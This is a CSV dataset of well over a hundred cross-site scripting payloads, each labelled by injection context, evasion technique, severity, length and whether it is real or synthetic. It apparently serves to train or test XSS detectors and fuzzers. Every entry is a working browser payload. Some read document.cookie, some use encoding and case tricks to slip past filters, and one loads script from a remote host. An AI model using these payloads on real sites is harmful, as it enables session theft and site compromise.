payload,context,technique,severity,length,source
"""><svg onclick=\u0061lert(document.cookie)>",tag_injection,synthetic,medium,43,synthetic
"<a href=""\x1Djavascript:javascript:alert(7241)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>,event_handler,none,medium,68,real
"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>",event_handler,none,medium,109,real
"<footer onmousemove=""alert(1)"">AnonKryptiQuz</footer>",event_handler,none,medium,53,real
<script>alert(location.hash)</script>,script_injection,synthetic,medium,37,synthetic
"""%3E%3Csvg onmouseover=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,68,synthetic
""" onerror=\u0061lert(document.cookie) """,attribute_escape,synthetic,medium,39,synthetic
"<div draggable=""true"" contenteditable>drag me</div><head ondrop=alert(1) contenteditable style=display:block>drop here</head>",event_handler,none,medium,125,real
"<dfn ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</dfn>",event_handler,none,medium,87,real
"<svg onerror=prompt(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,52,synthetic
013371337;ext=<img/src/onerror=import('//domain/')>,event_handler,none,low,51,real
%22%3E%3Csvg%20onload%3Dalert%26amp%3B%26amp%3B%23x00000040%221%22%29%3E,generic,url_encoding,low,72,real
<button onfocusout=alert(1) id=x></button><input autofocus>,event_handler,none,medium,59,real
""" onclick=prompt(1) """,attribute_escape,synthetic,medium,21,synthetic
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection,synthetic,medium,77,synthetic
<code onpointerover=alert(1) style=display:block>AnonKryptiQuz</code>,event_handler,none,medium,69,real
"<svg onload=""throw top.onerror=eval,'/*'+URL"">",attribute,restricted_chars,high,46,real
"<style>@keyframes slidein {}</style><canvas style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></canvas>",event_handler,none,medium,172,real
"<a href=""\x20javascript:javascript:alert(0743)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
<button popovertarget=x>Click me</button><legend ontoggle=alert(1) popover id=x>AnonKryptiQuz</legend>,event_handler,none,medium,102,real
"<div draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</div>",event_handler,none,medium,64,real
<svG oNfoCus=alErt(doCumEnt.coOkiE)>,tag_injection,synthetic,medium,36,synthetic
<col onpointerenter=alert(1) style=display:block>AnonKryptiQuz</col>,event_handler,none,medium,68,real
"<td ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</td>",event_handler,none,medium,85,real
"<input draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</input>",event_handler,none,medium,66,real
<svg ontoggl&#101;=confirm('XSS')>,tag_injection,synthetic,medium,34,synthetic
"setTimeout(""\u0061lert(document.domain)"",0)",dom_sink,synthetic,medium,43,synthetic
"SetTimEouT(""AleRt(StrIng.frOmCHarCodE(88,83,83))"",0)",dom_sink,synthetic,medium,52,synthetic
"<embed onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",event_handler,none,medium,72,real
<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>,event_handler,none,medium,74,real
“><iMg SrC=x onError​=prompt()>,tag_injection,case_variation,medium,31,real
<svg><script ?>alert(1),script_injection,none,medium,23,real
"<style>:target {color: red;}</style><datalist id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></datalist>",event_handler,none,medium,119,real
<var onpointerover=alert(1) style=display:block>AnonKryptiQuz</var>,event_handler,none,medium,67,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></hgroup>",event_handler,none,low,181,real
"<article oncut=""alert(1)"" contenteditable>AnonKryptiQuz</article>",event_handler,none,medium,65,real
"<thead onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</thead>",event_handler,none,medium,69,real
"<span onclick=""alert(1)"">AnonKryptiQuz</span>",event_handler,none,medium,45,real
"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=print()></bdi>",event_handler,none,low,108,real
"<svG oNbeGin=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,medium,56,synthetic
"<label onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</label>",event_handler,none,medium,63,real
"<STYLE TYPE=""text/javascript"">alert('AnonKryptiQuz');</STYLE>",attribute_escape,case_variation,medium,61,real
<svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>,script_injection,none,low,51,real
%3Csvg onfocus=alert(document.domain)%3E,tag_injection,synthetic,medium,40,synthetic
"""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",js_uri,none,medium,50,real
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationend=""alert(1)""></dialog>",event_handler,none,medium,97,real
<button popovertarget=x>Click me</button><form ontoggle=alert(1) popover id=x>AnonKryptiQuz</form>,event_handler,none,medium,98,real
<menu onpointerdown=alert(1) style=display:block>AnonKryptiQuz</menu>,event_handler,none,medium,69,real
/%09/javascript:alert(1);,js_uri,url_encoding,medium,25,real
<script>//prompt(%27XSS%27)</script>,script_injection,synthetic,medium,36,synthetic
"<video oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",generic,html_entity,medium,56,real
"<time onmouseup=""alert(1)"">AnonKryptiQuz</time>",event_handler,none,medium,47,real
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable style=display:block>drop here</dl>",event_handler,none,medium,125,real
"<style>@keyframes x{}</style><iframe style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></iframe>",event_handler,none,medium,105,real
"<title onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</title>",event_handler,none,medium,65,real
"<ins draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</ins>",event_handler,none,medium,84,real
"<cite ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</cite>",event_handler,none,medium,89,real
"<plaintext onmouseleave=""alert(1)"">AnonKryptiQuz</plaintext>",event_handler,none,medium,60,real
"<tt onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></tt>",event_handler,none,medium,277,real
"<time onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</time>",event_handler,none,medium,70,real
<sup onpointerleave=alert(1) style=display:block>AnonKryptiQuz</sup>,event_handler,none,medium,68,real
<iframe/onreadystatechange=alert(9115),event_handler,none,medium,38,real
%3Cscript%3Econfirm`document.domain`%3C/script%3E,script_injection,synthetic,medium,49,synthetic
<svG oNloAd=ConSolE.lOg(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,40,synthetic
<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>,event_handler,none,medium,60,real
"<select oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
<iframe srcdoc='&lt;body onload=prompt&lpar;1411&rpar;&gt;'>,event_handler,none,low,60,real
"<var onmouseleave=""alert(1)"">AnonKryptiQuz</var>",event_handler,none,medium,48,real
<svg onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,67,synthetic
?query=<img/src/onerror=alert(`AnonKryptiQuz`)>,event_handler,none,medium,47,real
<form onpointerover=alert(1) style=display:block>AnonKryptiQuz</form>,event_handler,none,medium,69,real
"<svg on&#101;rror=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,67,synthetic
""" ontoggle=\u0061lert(document.domain) """,attribute_escape,synthetic,medium,40,synthetic
alert(document['cookie']),generic,none,medium,25,real
"<big onmouseout=""alert(1)"">AnonKryptiQuz</big>",event_handler,none,medium,46,real
"<strike draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</strike>",event_handler,none,medium,90,real
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection,encoding|case_variation,medium,68,real
<ins onpointerup=alert(1) style=display:block>AnonKryptiQuz</ins>,event_handler,none,medium,65,real
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(9040)"">DEF",js_uri,none,medium,67,real
<svG oNbeGin=coNfiRm(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,38,synthetic
"<rp draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</rp>",event_handler,none,medium,62,real
"""><svg onload=console.log(1)>",tag_injection,synthetic,medium,29,synthetic
<noframes onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</noframes><input value=clickme>,event_handler,none,medium,116,real
"<noembed onmousedown=""alert(1)"">AnonKryptiQuz</noembed>",event_handler,none,medium,55,real
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,event_handler,none,medium,66,real
"' onmouseenter=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,55,synthetic
<blink onpointerdown=alert(1) style=display:block>AnonKryptiQuz</blink>,event_handler,none,medium,71,real
"<nobr oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>",event_handler,none,medium,99,real
""" onfocus=confirm('XSS') autofocus=""",attribute_escape,synthetic,medium,36,synthetic
<svg ontoggle=alert(%27XSS%27)/>,tag_injection,synthetic,medium,32,synthetic
%3Csvg onerror=confirm(document.domain)/%3E,tag_injection,synthetic,medium,43,synthetic
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?,tag_injection,url_encoding,low,972,real
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,event_handler,none,medium,56,real
"<meter draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</meter>",event_handler,none,medium,63,real
<svg ontoggle=alert(location.hash)/>,tag_injection,synthetic,medium,36,synthetic
<svg onclick=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,46,synthetic
<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>,event_handler,none,medium,53,real
"<picture draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",event_handler,none,medium,90,real
"ABC<div style=""x:\x09expression(javascript:alert(0926)"">DEF",js_uri,none,medium,59,real
<a2 onpointermove=alert(1) style=display:block>AnonKryptiQuz</a2>,event_handler,none,medium,65,real
' onload=alert('XSS') ',attribute_escape,synthetic,medium,23,synthetic
<s onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</s><input value=clickme>,event_handler,none,medium,102,real
%22 onbegin=prompt(document.domain) %22,attribute_escape,synthetic,medium,39,synthetic
%3Csvg onerror=prompt(1)/%3E,tag_injection,synthetic,medium,28,synthetic
"<b ondblclick=""alert(1)"">AnonKryptiQuz</b>",event_handler,none,medium,42,real
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",event_handler,none,medium,91,real
"setTimeout(%22prompt(document.cookie)%22,0)",dom_sink,synthetic,medium,43,synthetic
"<meta draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,64,real
autofocus ' onfocus='alert(document.domain)',event_handler,none,medium,44,real
<svg><noscript onload=alert(1)></noscript>,event_handler,none,medium,42,real
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationend=""alert(1)""></track>",event_handler,none,medium,95,real
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=print()></img>",event_handler,none,low,123,real
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",event_handler,none,medium,126,real
"&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity|url_encoding,low,95,real
"%22><svg onmouseover=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>,event_handler,none,medium,76,real
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionstart=alert(1)></object>",event_handler,none,medium,112,real
"<plaintext onmousedown=""alert(1)"">AnonKryptiQuz</plaintext>",event_handler,none,medium,59,real
<form id=test onforminput=javascript:alert(8938)><input></form><button form=test onformchange=javascript:alert(8938)>X,event_handler,none,medium,118,real
"<img src="""" onerror=""alert(document.cookie)"">",event_handler,none,high,45,real
"<input onfocus=""alert(0);"" autofocus>",event_handler,none,medium,37,real
""" onfocus=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,46,synthetic
"<animatetransform onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,94,real
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></input>",event_handler,none,medium,128,real
""" onmous&#101;&#101;nt&#101;r=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,61,synthetic
""" onmouseenter=alert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,53,synthetic
"<object onmouseover=""alert(1)"">AnonKryptiQuz</object>",event_handler,none,medium,53,real
%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(/xss/),generic,url_encoding,medium,54,real
"<option draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</option>",event_handler,none,medium,90,real
"<scRipT>/*/cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))</ScrIpt>",script_injection,synthetic,medium,58,synthetic
<strike onpointerenter=alert(1) style=display:block>AnonKryptiQuz</strike>,event_handler,none,medium,74,real
"""><Svg onMouSeeNteR=aLerT(1)>",tag_injection,synthetic,medium,29,synthetic
"<var oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
"<canvas onclick=""alert(1)"">AnonKryptiQuz</canvas>",event_handler,none,medium,49,real
"%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",event_handler,url_encoding,low,123,real
"""%3E%3Csvg onfocus=console.log(1)%3E",tag_injection,synthetic,medium,36,synthetic
"<samp draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</samp>",event_handler,none,medium,86,real
%22 ontoggle=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,35,synthetic
<script>//prompt(location.hash)</script>,script_injection,synthetic,medium,40,synthetic
' onerror=\u0061lert(document.cookie) ',attribute_escape,synthetic,medium,39,synthetic
"<ruby onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",event_handler,none,medium,61,real
"<style>:target {color:red;}</style><svg id=x style=""transition:color 1s"" ontransitionend=alert(1)></svg>",event_handler,none,medium,104,real
"<base onmousemove=""alert(1)"">AnonKryptiQuz</base>",event_handler,none,medium,49,real
"<q onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</q>",event_handler,none,medium,64,real
"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",event_handler,none,medium,114,real
<style onpointerout=alert(1) style=display:block>AnonKryptiQuz</style>,event_handler,none,medium,70,real
"""><Svg onMouSeeNteR=aLerT(dOcuMenT.dOmaIn)>",tag_injection,synthetic,medium,43,synthetic
"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=print()></strike>",event_handler,none,low,129,real
